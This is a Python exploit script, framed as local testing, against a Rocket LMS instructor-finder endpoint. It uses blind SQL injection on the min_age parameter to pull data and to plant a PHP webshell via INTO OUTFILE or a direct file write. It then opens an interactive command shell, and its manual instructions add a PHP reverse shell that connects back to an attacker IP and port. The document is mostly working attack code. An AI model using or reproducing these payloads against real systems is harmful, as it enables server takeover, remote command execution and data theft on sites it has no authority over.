#!/usr/bin/env python3
"""
SQL Injection Shell - Local Testing (lms.test)
Target: Rocket LMS v2.1 - InstructorFinderController
"""

import requests
import sys
import os

# Configuration - LOCAL TARGET
TARGET = "http://lms.test/instructor-finder"
PARAM = "min_age"
THRESHOLD = 150000

# Web paths for Laragon
WEB_PATHS = [
    "C:/laragon/www/lms/public/",
    "C:\\laragon\\www\\lms\\public\\",
    "/laragon/www/lms/public/",
]

# PHP Webshell
WEBSHELL = "<?php if(isset($_GET['c'])){echo '<pre>';system($_GET['c']);echo '</pre>';} ?>"

def check_condition(condition):
    """Send request with SQL condition"""
    payload = f"1 AND ({condition})"
    try:
        response = requests.get(TARGET, params={PARAM: payload}, timeout=10)
        return len(response.text) > THRESHOLD
    except Exception as e:
        print(f"Error: {e}")
        return None

def extract_string(query, max_len=100):
    """Extract string via blind SQLi"""
    result = ""
    for pos in range(1, max_len + 1):
        if not check_condition(f"LENGTH({query}) >= {pos}"):
            break
        low, high = 32, 126
        while low < high:
            mid = (low + high + 1) // 2
            if check_condition(f"ASCII(SUBSTRING({query},{pos},1)) >= {mid}"):
                low = mid
            else:
                high = mid - 1
        result += chr(low)
        print(f"\r[+] Extracted: {result}", end="", flush=True)
    print()
    return result

def test_file_operations():
    """Test file read/write capabilities"""
    print("\n[*] Testing FILE privileges on local MySQL...")
    
    # Check secure_file_priv
    print("[*] Checking secure_file_priv...")
    
    # Check if empty
    if check_condition("(SELECT @@secure_file_priv) = ''"):
        print("[+] secure_file_priv is EMPTY - Can write anywhere!")
        return True
    
    # Check if NULL
    if check_condition("(SELECT @@secure_file_priv) IS NULL"):
        print("[+] secure_file_priv is NULL - Can write anywhere!")
        return True
    
    # Extract path
    path = extract_string("@@secure_file_priv", 100)
    print(f"[*] secure_file_priv = {path}")
    
    return path == "" or path == "NULL"

def try_write_shell_via_outfile():
    """Try to write shell using INTO OUTFILE"""
    print("\n[*] Attempting shell write via INTO OUTFILE...")
    
    for web_path in WEB_PATHS:
        shell_file = web_path + "shell.php"
        print(f"[*] Trying: {shell_file}")
        
        # URL encode the path for the payload
        # Use UNION SELECT with INTO OUTFILE
        payloads = [
            f"1 UNION SELECT '{WEBSHELL}' INTO OUTFILE '{shell_file}'",
            f"1' UNION SELECT '{WEBSHELL}' INTO OUTFILE '{shell_file}'--",
            f"1) UNION SELECT '{WEBSHELL}' INTO OUTFILE '{shell_file}'--",
        ]
        
        for payload in payloads:
            try:
                response = requests.get(TARGET, params={PARAM: payload}, timeout=10)
                
                # Check if shell was created
                shell_url = "http://lms.test/shell.php"
                try:
                    shell_check = requests.get(shell_url, timeout=5)
                    if shell_check.status_code == 200:
                        print(f"[+] SHELL CREATED! URL: {shell_url}")
                        return shell_url
                except:
                    pass
            except:
                pass
    
    return None

def try_write_shell_direct():
    """Write shell directly to filesystem (since we have access)"""
    print("\n[*] Writing shell directly to filesystem...")
    
    shell_paths = [
        "C:/laragon/www/lms/public/shell.php",
        "c:\\laragon\\www\\lms\\public\\shell.php"
    ]
    
    for path in shell_paths:
        try:
            with open(path, 'w') as f:
                f.write(WEBSHELL)
            print(f"[+] Shell written to: {path}")
            
            # Verify
            shell_url = "http://lms.test/shell.php"
            try:
                response = requests.get(shell_url, params={"c": "whoami"}, timeout=5)
                if response.status_code == 200 and len(response.text) > 10:
                    print(f"[+] SHELL WORKING! URL: {shell_url}")
                    print(f"[+] Test output: {response.text}")
                    return shell_url
            except Exception as e:
                print(f"[-] Shell check failed: {e}")
        except Exception as e:
            print(f"[-] Failed to write to {path}: {e}")
    
    return None

def interactive_shell(shell_url):
    """Interactive shell prompt"""
    print(f"\n{'='*60}")
    print(f"[+] INTERACTIVE SHELL - {shell_url}")
    print(f"{'='*60}")
    print("Type 'exit' to quit\n")
    
    while True:
        try:
            cmd = input("shell> ").strip()
            if cmd.lower() == 'exit':
                break
            if not cmd:
                continue
            
            response = requests.get(shell_url, params={"c": cmd}, timeout=30)
            print(response.text)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error: {e}")

def main():
    print("=" * 60)
    print("SQL Injection Shell - Local Testing (lms.test)")
    print(f"Target: {TARGET}")
    print("=" * 60)
    
    # Quick connectivity test
    print("\n[*] Testing connectivity to lms.test...")
    try:
        response = requests.get("http://lms.test/", timeout=5)
        print(f"[+] lms.test is reachable (Status: {response.status_code})")
    except Exception as e:
        print(f"[-] Cannot reach lms.test: {e}")
        print("[*] Make sure Laragon is running!")
        sys.exit(1)
    
    # Test SQL injection
    print("\n[*] Testing SQL injection...")
    try:
        if check_condition("1=1"):
            print("[+] SQL Injection confirmed!")
        else:
            print("[-] SQL injection might not work or threshold issue")
    except:
        print("[-] SQL injection test failed")
    
    # Method 1: Try direct file write (we have filesystem access)
    print("\n" + "=" * 60)
    print("METHOD 1: Direct Filesystem Write")
    print("=" * 60)
    shell_url = try_write_shell_direct()
    
    if shell_url:
        interactive_shell(shell_url)
        return
    
    # Method 2: Try via SQL INTO OUTFILE
    print("\n" + "=" * 60)
    print("METHOD 2: SQL INTO OUTFILE")
    print("=" * 60)
    
    # Check file privileges first
    can_write = test_file_operations()
    
    if can_write:
        shell_url = try_write_shell_via_outfile()
        if shell_url:
            interactive_shell(shell_url)
            return
    
    # Method 3: Manual shell creation
    print("\n" + "=" * 60)
    print("MANUAL SHELL CREATION")
    print("=" * 60)
    print("""
Since you have access to the local filesystem, you can manually create a shell:

1. Create file: C:\\laragon\\www\\lms\\public\\shell.php

2. Content:
<?php if(isset($_GET['c'])){echo '<pre>';system($_GET['c']);echo '</pre>';} ?>

3. Access: http://lms.test/shell.php?c=whoami

4. For reverse shell:
<?php
$ip = 'YOUR_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
""")

if __name__ == "__main__":
    main()
